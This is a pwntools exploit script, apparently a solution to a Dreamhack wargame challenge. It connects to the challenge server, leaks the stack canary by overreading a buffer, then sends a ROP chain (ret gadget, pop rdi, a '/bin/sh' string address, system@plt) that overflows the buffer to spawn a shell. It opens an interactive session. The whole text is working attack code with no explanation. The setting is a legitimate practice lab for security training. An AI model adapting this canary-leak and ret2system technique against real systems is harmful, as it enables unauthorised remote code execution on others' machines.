from pwn import *

host="host3.dreamhack.games"
port=10252

p=remote(host,port)

canary_payload=b'A'*0x39

p.sendafter("Buf: ",canary_payload)
p.recvuntil(canary_payload)
canary=p64(u64(b'\x00'+p.recvn(7)))

print(hex(u64(canary)))

pop_rdi=p64(0x400853)
bin_sh=p64(0x400874)
system_plt=p64(0x4005d0)


payload=b'A'*0x38+canary+b'A'*8
payload += p64(0x400285) # ret
payload+=pop_rdi
payload+=bin_sh
payload+=system_plt


p.sendafter("Buf: ",payload)
p.interactive()
